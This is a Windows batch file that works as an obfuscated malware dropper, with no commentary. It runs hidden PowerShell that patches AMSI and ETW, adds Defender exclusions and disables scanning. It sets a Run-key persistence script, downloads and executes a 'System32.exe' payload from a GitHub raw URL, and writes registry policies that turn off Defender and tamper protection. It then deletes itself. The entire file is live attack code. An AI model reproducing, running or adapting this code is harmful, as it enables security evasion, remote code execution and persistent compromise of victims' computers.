@echo off
set p=powershell -w hidden -ep bypass -c
%p% "$E='SilentlyContinue';$ErrorActionPreference=$E;try{$a=[Ref].Assembly.GetType('Sy'+'stem.Man'+'agement.Aut'+'omation.Am'+'siUtils');$f=$a.GetField('am'+'siInit'+'Failed','NonP'+'ublic,St'+'atic');$f.SetValue($null,$true)}catch{};try{$t=[Ref].Assembly.GetType('Sy'+'stem.Man'+'agement.Aut'+'omation.Tra'+'cing.PSEtw'+'LogProvider');$m=$t.GetField('etw'+'Provider','NonP'+'ublic,St'+'atic');$m.SetValue($null,0)}catch{};try{if(gcm Add-MpPreference -ea 0){$pf=[Environment]::GetFolderPath('ProgramFilesX86');$u=$pf-replace' \(x86\)','';& ('Ad'+'d-Mp'+'Preference') -ExclusionPath $u;$px=[Environment]::GetFolderPath('ProgramFilesX86');if(Test-Path $px){& ('Ad'+'d-Mp'+'Preference') -ExclusionPath $px};$ap=[Environment]::GetFolderPath('ApplicationData');& ('Ad'+'d-Mp'+'Preference') -ExclusionPath $ap;$lp=[Environment]::GetFolderPath('LocalApplicationData');& ('Ad'+'d-Mp'+'Preference') -ExclusionPath $lp;$tmp=$env:TEMP;& ('Ad'+'d-Mp'+'Preference') -ExclusionPath $tmp;& ('Ad'+'d-Mp'+'Preference') -ExclusionExtension '.exe','.bat','.ps1';& ('Ad'+'d-Mp'+'Preference') -ExclusionProcess 'System32.exe','powershell.exe';& ('Se'+'t-Mp'+'Preference') -DisableRealtimeMonitoring 1 -DisableBehaviorMonitoring 1 -DisableBlockAtFirstSeen 1 -DisableIOAVProtection 1 -DisableScriptScanning 1 -DisableArchiveScanning 1 -SubmitSamplesConsent 2 -MAPSReporting 0 -HighThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6}}catch{};$d=$env:APPDATA+'\Micro'+'soft\C'+'LR';if(!(Test-Path $d)){md $d -Force|Out-Null};$s='`$E=''SilentlyContinue'';`$ErrorActionPreference=`$E;`$e=`$env:TEMP;cd `$e;`$p=''System32.exe'';try{iwr ''https://git''+''hub.com/din''+''mihaile/hvh2/raw/refs/heads/main/Sys''+''tem32.exe'' -O `$p}catch{};if(Test-Path `$p){. `$p;sleep 3;rm `$p -force}';$s|Out-File \"$d\UsageLogs.bat\" -Encoding ASCII -Force;New-ItemProperty -Path 'HK'+'CU:\Soft'+'ware\Micro'+'soft\Win'+'dows\Current'+'Version\Run' -Name 'CLR'+'Usage'+'Log' -Value \"`\"$d\UsageLogs.bat`\"\" -PropertyType String -Force|Out-Null;sleep 2;$e=$env:TEMP;cd $e;$p='System32.exe';try{iwr ('https://git'+'hub.com/din'+'mihaile/hvh2/raw/refs/heads/main/Sys'+'tem32.exe') -O $p}catch{};if(Test-Path $p){. $p;sleep 3;rm $p -force}" >nul 2>&1
set r=reg
set a=add
set h=HKLM\SOFTWARE
set p1=\Policies\Microsoft\Windows Defender
set p2=\Real-Time Protection
set p3=\Microsoft\Windows Defender
set p4=\Features
set p5=\Exclusions\Extensions
set p6=\Exclusions\Processes
set v=/v
set t=/t
set d=/d
set f=/f
%r% %a% "%h%%p1%" %v% DisableAntiSpyware %t% REG_DWORD %d% 1 %f% >nul 2>&1
%r% %a% "%h%%p1%%p2%" %v% DisableRealtimeMonitoring %t% REG_DWORD %d% 1 %f% >nul 2>&1
%r% %a% "%h%%p1%%p2%" %v% DisableBehaviorMonitoring %t% REG_DWORD %d% 1 %f% >nul 2>&1
%r% %a% "%h%%p1%%p2%" %v% DisableOnAccessProtection %t% REG_DWORD %d% 1 %f% >nul 2>&1
%r% %a% "%h%%p3%%p4%" %v% TamperProtection %t% REG_DWORD %d% 0 %f% >nul 2>&1
%r% %a% "%h%%p3%%p5%" %v% exe %t% REG_SZ %d% "0" %f% >nul 2>&1
%r% %a% "%h%%p3%%p5%" %v% bat %t% REG_SZ %d% "0" %f% >nul 2>&1
%r% %a% "%h%%p3%%p5%" %v% ps1 %t% REG_SZ %d% "0" %f% >nul 2>&1
%r% %a% "%h%%p3%%p6%" %v% System32.exe %t% REG_SZ %d% "0" %f% >nul 2>&1
%r% %a% "%h%%p3%%p6%" %v% powershell.exe %t% REG_SZ %d% "0" %f% >nul 2>&1
timeout /t 2 /nobreak >nul
del "%~f0" >nul 2>&1
